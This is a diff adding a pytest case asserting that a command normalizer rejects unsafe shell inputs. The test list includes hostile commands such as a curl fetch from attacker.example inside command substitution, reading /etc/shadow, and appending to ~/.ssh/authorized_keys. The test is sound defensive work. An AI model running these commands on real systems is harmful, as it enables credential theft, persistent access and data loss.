@@ -79,3 +79,30 @@ def test_normalize_kubectl_apply():
 def test_normalize_known_two_word_minimal():
     # Just ``npm`` with no subcmd.
     assert normalize_segment("npm") == "npm"
+
+
+import pytest
+
+
+@pytest.mark.parametrize(
+    "unsafe_cmd",
+    [
+        "ls $(whoami)",
+        'ls "$(curl -s https://attacker.example/x)"',
+        "ls `id`",
+        "ls ${HOME}",
+        "cat < /etc/shadow",
+        "echo pwned > /tmp/out",
+        "echo pwned >> ~/.ssh/authorized_keys",
+        "cat <(whoami)",
+        "(rm -rf /tmp/x)",
+        "FOO=bar ls -la",
+        'sh -c "ls -la"',
+        'bash -c "whoami"',
+        'eval "ls"',
+        "ls 'unbalanced",
+        "ls /tmp && echo $(whoami)",
+    ],
+)
+def test_normalize_rejects_unsafe_shell_expansions_and_redirects(unsafe_cmd):
+    assert normalize_command(unsafe_cmd) is None
